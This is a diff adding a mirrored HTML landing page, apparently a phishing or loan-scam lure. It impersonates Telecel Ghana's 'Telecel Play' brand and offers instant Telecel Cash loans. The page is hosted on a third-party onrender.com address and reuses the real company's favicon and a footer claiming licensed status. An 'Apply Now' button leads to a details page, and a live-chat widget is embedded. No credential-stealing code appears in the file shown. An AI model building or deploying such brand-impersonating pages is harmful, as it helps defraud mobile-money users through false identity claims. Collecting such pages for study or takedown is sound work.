@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from telecelghplaynew2026.onrender.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 21 Mar 2026 15:00:06 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<!-- /Added by HTTrack -->
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>play.telecel.com.gh</title>
+    <link rel="icon" href="https://play.telecel.com.gh/favicon.ico" type="image/x-icon">
+    <meta name="theme-color" content="#E30613">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html,
+        body {
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            background: #f8f9fc;
+            overflow-x: hidden;
+            overflow-y: auto;
+        }
+        
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: clamp(16px, 3vw, 24px);
+        }
+        
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: clamp(16px, 4vw, 24px);
+            text-align: center;
+            margin-bottom: clamp(16px, 4vw, 28px);
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
+        }
+        
+        .logo {
+            font-size: clamp(32px, 8vw, 40px);
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+        
+        .logo-telecel {
+            color: #E30613;
+        }
+        
+        .logo-play {
+            color: #0033A0;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: clamp(28px, 6vw, 40px) clamp(24px, 5vw, 32px);
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            gap: 32px;
+        }
+        
+        .hero-title {
+            font-size: clamp(24px, 6vw, 32px);
+            font-weight: 700;
+            color: #1a1a1a;
+            line-height: 1.15;
+            margin-bottom: 12px;
+        }
+        
+        .hero-subtitle {
+            font-size: clamp(15px, 3.5vw, 17px);
+            color: #495057;
+            max-width: 420px;
+            margin: 0 auto 32px;
+            line-height: 1.4;
+        }
+        
+        .calc-section {
+            background: #fff5f5;
+            border-radius: 16px;
+            padding: clamp(24px, 5vw, 32px);
+            border: 1px solid #ffebee;
+        }
+        
+        .calc-title {
+            font-size: clamp(18px, 4.5vw, 22px);
+            font-weight: 700;
+            color: #2c3e50;
+            margin-bottom: 28px;
+        }
+        
+        .input-group {
+            margin-bottom: 32px;
+        }
+        
+        .input-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-weight: 600;
+            font-size: clamp(14px, 3.5vw, 16px);
+            color: #2c3e50;
+        }
+        
+        .input-value {
+            color: #E30613;
+            font-weight: 700;
+        }
+        
+        .slider {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 10px;
+            border-radius: 5px;
+            background: #dee2e6;
+            outline: none;
+        }
+        
+        .slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: #E30613;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(227, 6, 19, 0.3);
+        }
+        
+        .range-labels {
+            display: flex;
+            justify-content: space-between;
+            color: #6c757d;
+            font-size: 13px;
+            margin-top: 8px;
+            font-weight: 500;
+        }
+        
+        .payment-box {
+            background: #fff5f5;
+            padding: 20px;
+            border-radius: 16px;
+            border: 1px solid #ffebee;
+            margin-top: 24px;
+        }
+        
+        .payment-label {
+            display: block;
+            color: #495057;
+            font-size: 15px;
+            margin-bottom: 8px;
+        }
+        
+        .payment-amount {
+            font-size: clamp(28px, 8vw, 36px);
+            font-weight: 800;
+            color: #E30613;
+            letter-spacing: -0.5px;
+        }
+        
+        .apply-btn {
+            width: 100%;
+            padding: clamp(16px, 4vw, 20px);
+            background: linear-gradient(90deg, #E30613, #b71c1c);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: clamp(17px, 4.5vw, 19px);
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 8px 24px rgba(227, 6, 19, 0.25);
+            transition: all 0.2s;
+            margin-bottom: 24px;
+        }
+        
+        .apply-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(227, 6, 19, 0.35);
+        }
+        
+        .features {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 24px;
+            margin-top: 16px;
+        }
+        
+        .feature {
+            text-align: center;
+            color: #495057;
+            font-size: clamp(13px, 3.5vw, 15px);
+            flex: 1 1 120px;
+            max-width: 140px;
+        }
+        
+        .feature-icon {
+            font-size: clamp(36px, 9vw, 44px);
+            margin-bottom: 12px;
+            display: block;
+        }
+        
+        .disclaimer {
+            font-size: 13px;
+            color: #6c757d;
+            margin-top: 16px;
+            line-height: 1.4;
+        }
+        
+        footer {
+            padding: clamp(20px, 5vw, 32px) 20px;
+            color: #adb5bd;
+            font-size: clamp(12px, 3vw, 14px);
+            text-align: center;
+            flex-shrink: 0;
+            margin-top: auto;
+        }
+        
+        @media (min-width:769px) {
+            body {
+                padding: 32px;
+                justify-content: center;
+            }
+            .card {
+                padding: 48px 40px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="logo"><span class="logo-telecel">Telecel</span><span class="logo-play">Play</span></div>
+    </header>
+    <main class="card">
+        <div>
+            <h1 class="hero-title">Instant Ready Loan on Telecel Cash</h1>
+            <p class="hero-subtitle">Receive a quick loan to your Telecel Cash wallet with fast approval and secure processing.</p>
+            <div class="calc-section">
+                <h2 class="calc-title">Estimate Loan & Repayment</h2>
+                <div class="input-group">
+                    <div class="input-header">
+                        <span class="input-label">Loan Amount (GH₵)</span>
+                        <span class="input-value" id="amountValue">GH₵5,000</span>
+                    </div>
+                    <input type="range" class="slider" min="500" max="50000" value="5000" id="amountSlider">
+                    <div class="range-labels"><span>GH₵500</span><span>GH₵50,000</span></div>
+                </div>
+                <div class="input-group">
+                    <div class="input-header">
+                        <span class="input-label">Loan Term (days)</span>
+                        <span class="input-value" id="termValue">30 days</span>
+                    </div>
+                    <input type="range" class="slider" min="7" max="90" value="30" id="termSlider">
+                    <div class="range-labels"><span>7 days</span><span>90 days</span></div>
+                </div>
+
+                <!-- ✅ APPLY NOW BUTTON MOVED ABOVE ESTIMATED REPAYMENT -->
+                <button class="apply-btn" id="applyBtn">Apply Now</button>
+
+                <div class="payment-box">
+                    <span class="payment-label">Estimated Total Repayment (Principal + prorated 8.9% fee)</span>
+                    <span class="payment-amount" id="paymentAmount">GH₵5,445.00</span>
+                </div>
+                <p class="disclaimer">Estimate only. Actual terms: 30 days, 8.9% fee; eligibility-based.</p>
+            </div>
+
+            <div class="features">
+                <div class="feature">
+                    <div class="feature-icon">⚡</div>Fast Approval<br><small>Often instant for eligible users</small></div>
+                <div class="feature">
+                    <div class="feature-icon">💰</div>8.9% Monthly Fee<br><small>Transparent & competitive</small></div>
+                <div class="feature">
+                    <div class="feature-icon">🔒</div>Secure Wallet<br><small>Protected transactions</small></div>
+            </div>
+        </div>
+    </main>
+    <footer>© 2026 Telecel Ghana – Licensed Mobile Financial Services | Powered by Telecel Cash & Telecel Play</footer>
+
+    <script>
+        const amountSlider = document.getElementById('amountSlider');
+        const termSlider = document.getElementById('termSlider');
+        const amountValue = document.getElementById('amountValue');
+        const termValue = document.getElementById('termValue');
+        const paymentAmount = document.getElementById('paymentAmount');
+
+        function updateCalculator() {
+            const amount = parseFloat(amountSlider.value);
+            const days = parseInt(termSlider.value);
+
+            amountValue.textContent = 'GH₵' + amount.toLocaleString();
+            termValue.textContent = days + ' day' + (days !== 1 ? 's' : '');
+
+            const monthlyFeeRate = 0.089;
+            const dailyFeeRate = monthlyFeeRate / 30;
+            const totalFee = amount * dailyFeeRate * days;
+            const totalRepay = amount + totalFee;
+
+            paymentAmount.textContent = 'GH₵' + totalRepay.toFixed(2);
+        }
+
+        updateCalculator();
+        amountSlider.addEventListener('input', updateCalculator);
+        termSlider.addEventListener('input', updateCalculator);
+
+        document.getElementById('applyBtn').addEventListener('click', function() {
+            const amount = parseFloat(amountSlider.value);
+            const days = parseInt(termSlider.value);
+            const monthlyFeeRate = 0.089;
+            const dailyFeeRate = monthlyFeeRate / 30;
+            const totalFee = amount * dailyFeeRate * days;
+            const totalRepay = amount + totalFee;
+
+            localStorage.setItem('loanAmount', amount.toString());
+            localStorage.setItem('loanTerm', days.toString());
+            localStorage.setItem('totalRepayment', totalRepay.toFixed(2));
+
+            window.location.href = 'details.html';
+        });
+    </script>
+
+    <!--Start of Tawk.to Script-->
+    <script type="text/javascript">
+        var Tawk_API = Tawk_API || {},
+            Tawk_LoadStart = new Date();
+        (function() {
+            var s1 = document.createElement("script"),
+                s0 = document.getElementsByTagName("script")[0];
+            s1.async = true;
+            s1.src = 'https://embed.tawk.to/687297843606072bf849fc63/1ivvpvno8';
+            s1.charset = 'UTF-8';
+            s1.setAttribute('crossorigin', '*');
+            s0.parentNode.insertBefore(s1, s0);
+        })();
+    </script>
+    <!--End of Tawk.to Script-->
+</body>
+
+<!-- Mirrored from telecelghplaynew2026.onrender.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 21 Mar 2026 15:00:07 GMT -->
+
+</html>
